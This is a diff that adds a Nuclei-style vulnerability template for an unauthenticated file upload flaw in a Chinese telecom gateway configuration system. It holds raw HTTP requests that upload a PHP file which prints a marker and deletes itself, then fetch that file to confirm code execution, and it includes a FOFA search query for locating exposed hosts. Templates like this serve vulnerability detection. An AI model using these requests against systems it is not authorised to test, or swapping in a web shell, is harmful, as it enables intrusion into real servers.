@@ -1,0 +1,43 @@
+id: dx-gateway-upload-channels-fileupload
+
+info:
+  name: 电信网关配置管理系统 upload_channels.php 任意文件上传
+  author: qwtd
+  severity: critical
+  description: 电信网关配置管理系统/bak_manager/upload_channels.php 接口存在文件上传漏洞,未经身份验证的远程攻击者可以利用文件上传漏洞获取系统权限。
+  metadata:
+    max-request: 2
+    fofa-query: body="a:link{text-decoration:none;color:orange;}"
+  tags: 电信网关配置管理系统
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /bak_manager/upload_channels.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
+        Content-Type: text/plain
+
+        <?php print('randstr123456');unlink(__FILE__);?>
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+
+
+        ------WebKitFormBoundaryOKldnDPT--
+      - |
+        GET /bak_manager/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+          - 'contains(body_2, "randstr123456")'
+        condition: and
